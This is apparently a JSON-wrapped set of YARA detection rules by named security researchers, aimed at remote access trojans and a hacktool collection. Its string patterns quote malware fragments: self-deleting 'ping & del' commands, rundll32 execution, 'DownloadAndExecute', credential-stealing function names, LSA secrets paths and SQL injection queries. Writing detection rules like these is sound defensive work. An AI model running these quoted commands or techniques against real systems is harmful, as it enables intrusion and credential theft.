  "sakula_v1_1": "rule sakula_v1_1: RAT\n{\n    meta:\n        description = \"Sakula v1.1\"\n        date = \"2015-10-13\"\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou\"\n    strings:\n        $m1 = \"%d_of_%d_for_%s_on_%s\"\n        $m2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $m3 = \"=%s&type=%d\"\n        $m4 = \"?photoid=\"\n        $m5 = \"iexplorer\"\n                $m6 = \"net start \\\"%s\\\"\"\n        $v1_1 = \"MicroPlayerUpdate.exe\"\n        $MZ = \"MZ\"\n    condition:\n        $MZ at 0 and all of them\n}",
  "sakula_v1_2": "rule sakula_v1_2: RAT\n{\n    meta:\n        description = \"Sakula v1.2\"\n        date = \"2015-10-13\"\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou\"\n    strings:\n        $m1 = \"%d_of_%d_for_%s_on_%s\"\n        $m2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $m3 = \"cmd.exe /c rundll32 \\\"%s\\\"\"\n        $v1_1 = \"MicroPlayerUpdate.exe\"\n        $v1_2 = \"CCPUpdate\"\n\n        $MZ = \"MZ\"\n    condition:\n        $MZ at 0 and $m1 and $m2 and $m3 and $v1_2 and not $v1_1\n}",
  "sakula_v1_3": "rule sakula_v1_3: RAT\n{\n    meta:\n        description = \"Sakula v1.3\"\n        date = \"2015-10-13\"\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou\"\n    strings:\n        $m1 = \"%d_of_%d_for_%s_on_%s\"\n        $m2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $m3 = \"cmd.exe /c rundll32 \\\"%s\\\"\"\n\n        $v1_3 = { 81 3E 78 03 00 00 75 57  8D 54 24 14 52 68 0C 05 41 00 68 01 00 00 80 FF  15 00 F0 40 00 85 C0 74 10 8B 44 24 14 68 2C 31  41 00 50 FF 15 10 F0 40 00 8B 4C 24 14 51 FF 15  24 F0 40 00 E8 0F 09 00 }\n\n        $MZ = \"MZ\"\n    condition:\n        $MZ at 0 and all of them\n}",
  "sakula_v1_4": "rule sakula_v1_4: RAT\n{\n    meta:\n        description = \"Sakula v1.4\"\n        date = \"2015-10-13\"\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou\"\n    strings:\n        $m1 = \"%d_of_%d_for_%s_on_%s\"\n        $m2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $m3 = \"cmd.exe /c rundll32 \\\"%s\\\"\"\n\n        $v1_4 = { 50 E8 CD FC FF FF 83 C4  04 68 E8 03 00 00 FF D7 56 E8 54 12 00 00 E9 AE  FE FF FF E8 13 F5 FF FF }\n\n        $MZ = \"MZ\"\n    condition:\n        $MZ at 0 and all of them\n}",
  "ShadowTech_2": "rule ShadowTech_2\n{\n    meta:\n        description = \"ShadowTech RAT\"\n\tauthor = \"botherder https://github.com/botherder\"\n\n    strings:\n        $string1 = /\\#(S)trings/\n        $string2 = /\\#(G)UID/\n        $string3 = /\\#(B)lob/\n        $string4 = /(S)hadowTech Rat\\.exe/\n        $string5 = /(S)hadowTech_Rat/\n\n    condition:\n        all of them\n}",
  "ShadowTech": "rule ShadowTech\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/ShadowTech\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"ShadowTech\" nocase\n\t\t$b = \"DownloadContainer\"\n\t\t$c = \"MySettings\"\n\t\t$d = \"System.Configuration\"\n\t\t$newline = \"#-@NewLine@-#\" wide\n\t\t$split = \"pSIL\" wide\n\t\t$key = \"ESIL\" wide\n\n\tcondition:\n\t\t4 of them\n}",
  "shimrat": "rule shimrat: RAT\n{\n meta:\n  description = \"Detects ShimRat and the ShimRat loader\"\n  author = \"Yonathan Klijnsma (yonathan.klijnsma@fox-it.com)\"\n  date = \"20/11/2015\"\n  ref = \"https://blog.fox-it.com/2016/06/15/mofang-a-politically-motivated-information-stealing-adversary/\"\n  \n strings:\n  $dll = \".dll\"\n  $dat = \".dat\"\n  $headersig = \"QWERTYUIOPLKJHG\"\n  $datasig = \"MNBVCXZLKJHGFDS\"\n  $datamarker1 = \"Data$$00\"\n  $datamarker2 = \"Data$$01%c%sData\"\n  $cmdlineformat = \"ping localhost -n 9 /c %s > nul\"\n  $demoproject_keyword1 = \"Demo\"\n  $demoproject_keyword2 = \"Win32App\"\n  $comspec = \"COMSPEC\"\n  $shim_func1 = \"ShimMain\"\n  $shim_func2 = \"NotifyShims\"\n  $shim_func3 = \"GetHookAPIs\"\n\n\n condition:\n  ($dll and $dat and $headersig and $datasig) or ($datamarker1 and $datamarker2) or ($cmdlineformat and $demoproject_keyword1 and $demoproject_keyword2 and $comspec) or ($dll and $dat and $shim_func1 and $shim_func2 and $shim_func3)\n}",
  "shimratreporter": "rule shimratreporter: RAT\n{\n meta:\n  description = \"Detects ShimRatReporter\"\n  author = \"Yonathan Klijnsma (yonathan.klijnsma@fox-it.com)\"\n  date = \"20/11/2015\"\n  ref = \"https://blog.fox-it.com/2016/06/15/mofang-a-politically-motivated-information-stealing-adversary/\"\n\n\n strings:\n  $IpInfo = \"IP-INFO\"\n  $NetworkInfo = \"Network-INFO\"\n  $OsInfo = \"OS-INFO\"\n  $ProcessInfo = \"Process-INFO\"\n  $BrowserInfo = \"Browser-INFO\"\n  $QueryUserInfo = \"QueryUser-INFO\"\n  $UsersInfo = \"Users-INFO\"\n  $SoftwareInfo = \"Software-INFO\"\n  $AddressFormat = \"%02X-%02X-%02X-%02X-%02X-%02X\"\n  $proxy_str = \"(from environment) = %s\"\n\n  $netuserfun = \"NetUserEnum\"\n  $networkparams = \"GetNetworkParams\"\n\n condition:\n  all of them\n}",
  "TerminatorRat": "rule TerminatorRat : RAT \n{\n\tmeta:\n\t\tdescription = \"Terminator RAT\" \n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdate = \"2013-10-24\"\n\t\tfiletype = \"memory\"\n\t\tversion = \"1.0\" \n\t\tref1 = \"http://www.fireeye.com/blog/technical/malware-research/2013/10/evasive-tactics-terminator-rat.html\" \n\n\tstrings:\n\t\t$a = \"Accelorator\"\n\t\t$b = \"<html><title>12356</title><body>\"\n\n\tcondition:\n\t\tall of them\n}",
  "TROJAN_Notepad_shell_crew": "rule TROJAN_Notepad_shell_crew : Trojan {\n        meta:\n                author = \"RSA_IR\"\n                Date     = \"4Jun13\"\n                File     = \"notepad.exe v 1.1\"\n                MD5      = \"106E63DBDA3A76BEEB53A8BBD8F98927\"\n        strings:\n                $s1 = \"75BAA77C842BE168B0F66C42C7885997\"\n                $s2 = \"B523F63566F407F3834BCC54AAA32524\"\n        condition:\n                $s1 or $s2\n}",
  "Xtreme": "rule Xtreme\n{\n    meta:\n        description = \"Xtreme RAT\"\n\tauthor = \"botherder https://github.com/botherder\"\n\n    strings:\n        $string1 = /(X)tremeKeylogger/ wide ascii\n        $string2 = /(X)tremeRAT/ wide ascii\n        $string3 = /(X)TREMEUPDATE/ wide ascii\n        $string4 = /(S)TUBXTREMEINJECTED/ wide ascii\n\n        $unit1 = /(U)nitConfigs/ wide ascii\n        $unit2 = /(U)nitGetServer/ wide ascii\n        $unit3 = /(U)nitKeylogger/ wide ascii\n        $unit4 = /(U)nitCryptString/ wide ascii\n        $unit5 = /(U)nitInstallServer/ wide ascii\n        $unit6 = /(U)nitInjectServer/ wide ascii\n        $unit7 = /(U)nitBinder/ wide ascii\n        $unit8 = /(U)nitInjectProcess/ wide ascii\n\n    condition:\n        5 of them\n}",
  "xtreme_rat": "rule xtreme_rat : Trojan\n{\n\tmeta:\n\t\tauthor=\"Kevin Falcoz\"\n\t\tdate=\"23/02/2013\"\n\t\tdescription=\"Xtreme RAT\"\n\t\n\tstrings:\n\t\t$signature1={58 00 54 00 52 00 45 00 4D 00 45} /*X.T.R.E.M.E*/\n\t\t\n\tcondition:\n\t\t$signature1\n}",
  "XtremeRAT": "rule XtremeRAT : Family\n{\n    meta:\n        description = \"XtremeRAT\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-09\"\n        \n    condition:\n        XtremeRATCode or XtremeRATStrings\n}",
  "xtremrat": "rule xtremrat : rat\n{\n\tmeta:\n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdescription = \"Xtrem RAT v3.5\"\n\t\tdate = \"2012-07-12\" \n\t\tversion = \"1.0\" \n\t\tfiletype = \"memory\"\n\n\tstrings:\n\t\t$a = \"XTREME\" wide\n\t\t$b = \"XTREMEBINDER\" wide\n\t\t$c = \"STARTSERVERBUFFER\" wide\n\t\t$d = \"SOFTWARE\\\\XtremeRAT\" wide\n\t\t$e = \"XTREMEUPDATE\" wide\n\t\t$f = \"XtremeKeylogger\" wide\n\t\t$g = \"myversion|3.5\" wide\n\t\t$h = \"xtreme rat\" wide nocase\n\tcondition:\n\t\t2 of them\n}",
  "xtreme_rat_0": "rule xtreme_rat_0\n{ \n\tmeta:\n\t\tmaltype = \"Xtreme RAT\"\n\t\treference = \"http://blog.trendmicro.com/trendlabs-security-intelligence/xtreme-rat-targets-israeli-government/\"\n\tstrings:\n\t\t$type=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid=\"5156\"\n\t\t$data=\"windows\\\\system32\\\\sethc.exe\"\n\n\t\t$type1=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid1=\"4688\"\n\t\t$data1=\"AppData\\\\Local\\\\Temp\\\\Microsoft Word.exe\"\n\tcondition:\n\t\tall of them\n}",
  "xtreme_rat_1": "rule xtreme_rat_1\n{ \n\tmeta:\n\t\tmaltype = \"Xtreme RAT\"\n\t\tref = \"https://github.com/reed1713\"\n\t\treference = \"http://blog.trendmicro.com/trendlabs-security-intelligence/xtreme-rat-targets-israeli-government/\"\n\tstrings:\n\t\t$type=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid=\"5156\"\n\t\t$data=\"windows\\\\system32\\\\sethc.exe\"\n\n\t\t$type1=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid1=\"4688\"\n\t\t$data1=\"AppData\\\\Local\\\\Temp\\\\Microsoft Word.exe\"\n\tcondition:\n\t\tall of them\n}",
  "zoxPNG_RAT": "rule zoxPNG_RAT\n{\n    meta:\n        Author      = \"Novetta Advanced Research Group\"\n        Date        = \"2014/11/14\"\n        Description = \"ZoxPNG RAT, url inside\"\n        Reference   = \"http://www.novetta.com/wp-content/uploads/2014/11/ZoxPNG.pdf\"\n\n    strings: \n        $url = \"png&w=800&h=600&ei=CnJcUcSBL4rFkQX444HYCw&zoom=1&ved=1t:3588,r:1,s:0,i:92&iact=rc&dur=368&page=1&tbnh=184&tbnw=259&start=0&ndsp=20&tx=114&ty=58\"\n\n    condition: \n        $url\n}",
  "jRAT_conf": "rule jRAT_conf : RAT \n{\n\tmeta:\n\t\tdescription = \"jRAT configuration\" \n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdate = \"2013-10-11\"\n\t\tfiletype = \"memory\"\n\t\tversion = \"1.0\" \n\t\tref1 = \"https://github.com/MalwareLu/config_extractor/blob/master/config_jRAT.py\" \n\t\tref2 = \"http://www.ghettoforensics.com/2013/10/dumping-malware-configuration-data-from.html\" \n\n\tstrings:\n\t\t$a = /port=[0-9]{1,5}SPLIT/ \n\n\tcondition: \n\t\t$a\n}",
  "xRAT": "rule xRAT : RAT\n{\n    meta:\n        author = \" Kevin Breen <kevin@techanarchy.net>\"\n        date = \"2014/04\"\n        ref = \"http://malwareconfig.com/stats/xRat\"\n        maltype = \"Remote Access Trojan\"\n        filetype = \"exe\"\n\n    strings:\n        $v1a = \"DecodeProductKey\"\n        $v1b = \"StartHTTPFlood\"\n        $v1c = \"CodeKey\"\n        $v1d = \"MESSAGEBOX\"\n        $v1e = \"GetFilezillaPasswords\"\n        $v1f = \"DataIn\"\n        $v1g = \"UDPzSockets\"\n        $v1h = {52 00 54 00 5F 00 52 00 43 00 44 00 41 00 54 00 41}\n\n        $v2a = \"<URL>k__BackingField\"\n        $v2b = \"<RunHidden>k__BackingField\"\n        $v2c = \"DownloadAndExecute\"\n        $v2d = \"-CHECK & PING -n 2 127.0.0.1 & EXIT\" wide\n        $v2e = \"england.png\" wide\n        $v2f = \"Showed Messagebox\" wide\n    condition:\n        all of ($v1*) or all of ($v2*)\n}",
  "xRAT20": "rule xRAT20 : RAT\n{\nmeta:\n\tauthor = \"Rottweiler\"\n\tdate = \"2015-08-20\"\n\tdescription = \"Identifies xRAT 2.0 samples\"\n\tmaltype = \"Remote Access Trojan\"\n\thash0 = \"cda610f9cba6b6242ebce9f31faf5d9c\"\n\thash1 = \"60d7b0d2dfe937ac6478807aa7043525\"\n\thash2 = \"d1b577fbfd25cc5b873b202cfe61b5b8\"\n\thash3 = \"1820fa722906569e3f209d1dab3d1360\"\n\thash4 = \"8993b85f5c138b0afacc3ff04a2d7871\"\n\thash5 = \"0c231ed8a800b0f17f897241f1d5f4e3\"\n\thash1 = \"60d7b0d2dfe937ac6478807aa7043525\"\n\thash8 = \"2c198e3e0e299a51e5d955bb83c62a5e\"\n\tsample_filetype = \"exe\"\n\tyaragenerator = \"https://github.com/Xen0ph0n/YaraGenerator\"\nstrings:\n\t$string0 = \"GetDirectory: File not found\" wide\n\t$string1 = \"<>m__Finally8\"\n\t$string2 = \"Secure\"\n\t$string3 = \"ReverseProxyClient\"\n\t$string4 = \"DriveDisplayName\"\n\t$string5 = \"<IsError>k__BackingField\"\n\t$string6 = \"set_InstallPath\"\n\t$string7 = \"memcmp\"\n\t$string8 = \"urlHistory\"\n\t$string9 = \"set_AllowAutoRedirect\"\n\t$string10 = \"lpInitData\"\n\t$string11 = \"reader\"\n\t$string12 = \"<FromRawDataGlobal>d__f\"\n\t$string13 = \"mq.png\" wide\n\t$string14 = \"remove_KeyDown\"\n\t$string15 = \"ProtectedData\"\n\t$string16 = \"m_hotkeys\"\n\t$string17 = \"get_Hour\"\n\t$string18 = \"\\\\mozglue.dll\" wide\ncondition:\n\t18 of them\n}",
  "mswin_check_lm_group": "rule mswin_check_lm_group {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file mswin_check_lm_group.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"115d87d7e7a3d08802a9e5fd6cd08e2ec633c367\"\n\tstrings:\n\t\t$s1 = \"Valid_Global_Groups: checking group membership of '%s\\\\%s'.\" fullword ascii\n\t\t$s2 = \"Usage: %s [-D domain][-G][-P][-c][-d][-h]\" fullword ascii\n\t\t$s3 = \"-D    default user Domain\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 380KB and all of them\n}",
  "WAF_Bypass": "rule WAF_Bypass {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file WAF-Bypass.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"860a9d7aac2ce3a40ac54a4a0bd442c6b945fa4e\"\n\tstrings:\n\t\t$s1 = \"Email: blacksplitn@gmail.com\" fullword wide\n\t\t$s2 = \"User-Agent:\" fullword wide\n\t\t$s3 = \"Send Failed.in RemoteThread\" fullword ascii\n\t\t$s4 = \"www.example.com\" fullword wide\n\t\t$s5 = \"Get Domain:%s IP Failed.\" fullword ascii\n\t\t$s6 = \"Connect To Server Failed.\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 7992KB and 5 of them\n}",
  "Guilin_veterans_cookie_spoofing_tool": "rule Guilin_veterans_cookie_spoofing_tool {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Guilin veterans cookie spoofing tool.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"06b1969bc35b2ee8d66f7ce8a2120d3016a00bb1\"\n\tstrings:\n\t\t$s0 = \"kernel32.dll^G\" fullword ascii\n\t\t$s1 = \"\\\\.Sus\\\"B\" fullword ascii\n\t\t$s4 = \"u56Load3\" fullword ascii\n\t\t$s11 = \"O MYTMP(iM) VALUES (\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1387KB and all of them\n}",
  "MarathonTool": "rule MarathonTool {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file MarathonTool.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"084a27cd3404554cc799d0e689f65880e10b59e3\"\n\tstrings:\n\t\t$s0 = \"MarathonTool\" ascii\n\t\t$s17 = \"/Blind SQL injection tool based in heavy queries\" fullword ascii\n\t\t$s18 = \"SELECT UNICODE(SUBSTRING((system_user),{0},1))\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1040KB and all of them\n}",
  "PLUGIN_TracKid": "rule PLUGIN_TracKid {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file TracKid.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"a114181b334e850d4b33e9be2794f5bb0eb59a09\"\n\tstrings:\n\t\t$s0 = \"E-mail: cracker_prince@163.com\" fullword ascii\n\t\t$s1 = \".\\\\TracKid Log\\\\%s.txt\" fullword ascii\n\t\t$s2 = \"Coded by prince\" fullword ascii\n\t\t$s3 = \"TracKid.dll\" fullword ascii\n\t\t$s4 = \".\\\\TracKid Log\" fullword ascii\n\t\t$s5 = \"%08x -- %s\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and 3 of them\n}",
  "Pc_pc2015": "rule Pc_pc2015 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file pc2015.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"de4f098611ac9eece91b079050b2d0b23afe0bcb\"\n\tstrings:\n\t\t$s0 = \"\\\\svchost.exe\" fullword ascii\n\t\t$s1 = \"LON\\\\OD\\\\O-\\\\O)\\\\O%\\\\O!\\\\O=\\\\O9\\\\O5\\\\O1\\\\O\" fullword ascii\n\t\t$s8 = \"%s%08x.001\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 309KB and all of them\n}",
  "sekurlsa": "rule sekurlsa {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file sekurlsa.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"6acecd18fc7da1c5eb0d04e848aae9ce59d2b1b5\"\n\tstrings:\n\t\t$s1 = \"Bienvenue dans un processus distant\" fullword wide\n\t\t$s2 = \"Format d'appel invalide : addLogonSession [idSecAppHigh] idSecAppLow Utilisateur\" wide\n\t\t$s3 = \"SECURITY\\\\Policy\\\\Secrets\" fullword wide\n\t\t$s4 = \"Injection de donn\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1150KB and all of them\n}",
  "mysqlfast": "rule mysqlfast {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file mysqlfast.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"32b60350390fe7024af7b4b8fbf50f13306c546f\"\n\tstrings:\n\t\t$s2 = \"Invalid password hash: %s\" fullword ascii\n\t\t$s3 = \"-= MySql Hash Cracker =- \" fullword ascii\n\t\t$s4 = \"Usage: %s hash\" fullword ascii\n\t\t$s5 = \"Hash: %08lx%08lx\" fullword ascii\n\t\t$s6 = \"Found pass: \" fullword ascii\n\t\t$s7 = \"Pass not found\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 900KB and 4 of them\n}",
  "DTools2_02_DTools": "rule DTools2_02_DTools {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file DTools.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"9f99771427120d09ec7afa3b21a1cb9ed720af12\"\n\tstrings:\n\t\t$s0 = \"kernel32.dll\" ascii\n\t\t$s1 = \"TSETPASSWORDFORM\" fullword wide\n\t\t$s2 = \"TGETNTUSERNAMEFORM\" fullword wide\n\t\t$s3 = \"TPORTFORM\" fullword wide\n\t\t$s4 = \"ShellFold\" fullword ascii\n\t\t$s5 = \"DefaultPHotLigh\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 2000KB and all of them\n}",
  "dll_PacketX": "rule dll_PacketX {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file PacketX.dll - ActiveX wrapper for WinPcap packet capture library\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\tscore = 50\n\t\thash = \"3f0908e0a38512d2a4fb05a824aa0f6cf3ba3b71\"\n\tstrings:\n\t\t$s9 = \"[Failed to load winpcap packet.dll.\" wide\n\t\t$s10 = \"PacketX Version\" wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1920KB and all of them\n}",
  "SqlDbx_zhs": "rule SqlDbx_zhs {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file SqlDbx_zhs.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"e34228345498a48d7f529dbdffcd919da2dea414\"\n\tstrings:\n\t\t$s0 = \"S.failed_logins \\\"Failed Login Attempts\\\", \" fullword ascii\n\t\t$s7 = \"SELECT ROLE, PASSWORD_REQUIRED FROM SYS.DBA_ROLES ORDER BY ROLE\" fullword ascii\n\t\t$s8 = \"SELECT spid 'SPID', status 'Status', db_name (dbid) 'Database', loginame 'Login'\" ascii\n\t\t$s9 = \"bcp.exe <:schema:>.<:table:> out \\\"<:file:>\\\" -n -S <:server:> -U <:user:> -P <:\" ascii\n\t\t$s11 = \"L.login_policy_name AS \\\"Login Policy\\\", \" fullword ascii\n\t\t$s12 = \"mailto:support@sqldbx.com\" fullword ascii\n\t\t$s15 = \"S.last_login_time \\\"Last Login\\\", \" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and 4 of them\n}",
  "ms10048_x86": "rule ms10048_x86 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ms10048-x86.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"e57b453966e4827e2effa4e153f2923e7d058702\"\n\tstrings:\n\t\t$s1 = \"[ ] Resolving PsLookupProcessByProcessId\" fullword ascii\n\t\t$s2 = \"The target is most likely patched.\" fullword ascii\n\t\t$s3 = \"Dojibiron by Ronald Huizer, (c) master@h4cker.us .\" fullword ascii\n\t\t$s4 = \"[ ] Creating evil window\" fullword ascii\n\t\t$s5 = \"%sHANDLEF_INDESTROY\" fullword ascii\n\t\t$s6 = \"[+] Set to %d exploit half succeeded\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 4 of them\n}",
  "Dos_ch": "rule Dos_ch {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ch.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"60bbb87b08af840f21536b313a76646e7c1f0ea7\"\n\tstrings:\n\t\t$s0 = \"/Churraskito/-->Usage: Churraskito.exe \\\"command\\\" \" fullword ascii\n\t\t$s4 = \"fuck,can't find WMI process PID.\" fullword ascii\n\t\t$s5 = \"/Churraskito/-->Found token %s \" fullword ascii\n\t\t$s8 = \"wmiprvse.exe\" fullword ascii\n\t\t$s10 = \"SELECT * FROM IIsWebInfo\" fullword ascii\n\t\t$s17 = \"WinSta0\\\\Default\" fullword ascii  /* Goodware String - occured 22 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 260KB and 3 of them\n}",
  "DUBrute_DUBrute": "rule DUBrute_DUBrute {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file DUBrute.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"8aaae91791bf782c92b97c6e1b0f78fb2a9f3e65\"\n\tstrings:\n\t\t$s1 = \"IP - %d; Login - %d; Password - %d; Combination - %d\" fullword ascii\n\t\t$s2 = \"IP - 0; Login - 0; Password - 0; Combination - 0\" fullword ascii\n\t\t$s3 = \"Create %d IP@Loginl;Password\" fullword ascii\n\t\t$s4 = \"UBrute.com\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1020KB and all of them\n}",
  "CookieTools": "rule CookieTools {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file CookieTools.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b6a3727fe3d214f4fb03aa43fb2bc6fadc42c8be\"\n\tstrings:\n\t\t$s0 = \"http://210.73.64.88/doorway/cgi-bin/getclientip.asp?IP=\" fullword ascii\n\t\t$s2 = \"No data to read.$Can not bind in port range (%d - %d)\" fullword wide\n\t\t$s3 = \"Connection Closed Gracefully.;Could not bind socket. Address and port are alread\" wide\n\t\t$s8 = \"OnGetPasswordP\" fullword ascii\n\t\t$s12 = \"http://www.chinesehack.org/\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 5000KB and 2 of them\n}",
  "update_PcInit": "rule update_PcInit {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file PcInit.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"a6facc4453f8cd81b8c18b3b3004fa4d8e2f5344\"\n\tstrings:\n\t\t$s1 = \"\\\\svchost.exe\" fullword ascii\n\t\t$s2 = \"%s%08x.001\" fullword ascii\n\t\t$s3 = \"Global\\\\ps%08x\" fullword ascii\n\t\t$s4 = \"drivers\\\\\" fullword ascii /* Goodware String - occured 2 times */\n\t\t$s5 = \"StrStrA\" fullword ascii /* Goodware String - occured 43 times */\n\t\t$s6 = \"StrToIntA\" fullword ascii /* Goodware String - occured 44 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 50KB and all of them\n}",
  "dat_NaslLib": "rule dat_NaslLib {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file NaslLib.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"fb0d4263118faaeed2d68e12fab24c59953e862d\"\n\tstrings:\n\t\t$s1 = \"nessus_get_socket_from_connection: fd <%d> is closed\" fullword ascii\n\t\t$s2 = \"[*] \\\"%s\\\" completed, %d/%d/%d/%d:%d:%d - %d/%d/%d/%d:%d:%d\" fullword ascii\n\t\t$s3 = \"A FsSniffer backdoor seems to be running on this port%s\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1360KB and all of them\n}",
  "Dos_1": "rule Dos_1 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file 1.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b554f0687a12ec3a137f321cc15e052ff219f28c\"\n\tstrings:\n\t\t$s1 = \"/churrasco/-->Usage: Churrasco.exe \\\"command to run\\\"\" fullword ascii\n\t\t$s2 = \"/churrasco/-->Done, command should have ran as SYSTEM!\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}",
  "OtherTools_servu": "rule OtherTools_servu {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file svu.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5c64e6879a9746a0d65226706e0edc7a\"\n\tstrings:\n\t\t$s0 = \"MZKERNEL32.DLL\" fullword ascii\n\t\t$s1 = \"UpackByDwing@\" fullword ascii\n\t\t$s2 = \"GetProcAddress\" fullword ascii\n\t\t$s3 = \"WriteFile\" fullword ascii\n\tcondition:\n\t\t$s0 at 0 and filesize < 50KB and all of them\n}",
